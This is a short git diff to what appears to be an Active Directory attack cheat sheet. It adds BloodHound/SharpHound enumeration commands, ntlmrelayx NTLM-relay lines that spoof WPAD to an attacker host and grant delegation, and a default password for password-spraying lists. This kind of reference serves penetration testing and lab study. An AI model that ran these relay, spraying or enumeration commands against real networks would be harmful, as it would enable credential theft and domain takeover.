@@ -77,6 +77,8 @@
   SharpHound.exe (from resources/Ingestor)
   SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
   SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
+  SharpHound.exe -c all -d active.htb -SearchForest
+  SharpHound.exe --EncryptZip --ZipFilename export.zip
   or 
   Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
   or 
@@ -112,6 +114,7 @@
   # -wh: Server hosting WPAD file (Attacker’s IP)
   # -t: Target (You cannot relay credentials to the same device that you’re spoofing)
   # -i: open an interactive shell
+  ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
   ```
 
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
@@ -540,7 +543,7 @@ Password spraying refers to the attack method that takes a large number of usern
 
 Most of the time the best passwords to spray are :
 
-- Password123, mimikatz
+- P@ssw0rd01, Password123, mimikatz
 - Welcome1/Welcome01
 - $Companyname1 : $Microsoft1
 - SeasonYear : Winter2019*,Spring2020!,Summer2018? 
@@ -936,9 +939,9 @@ cme smb $hosts --gen-relay-list relay.txt
 mitm6 -i eth0 -d $domain
 
 # spoofing WPAD and relaying NTLM credentials
-http://ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
+ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
 or 
-http://ntlmrelayx.py -6 -wh $attacker_ip -l /tmp -socks -debug
+ntlmrelayx.py -6 -wh $attacker_ip -l /tmp -socks -debug
 ```
 
 #### Drop the MIC
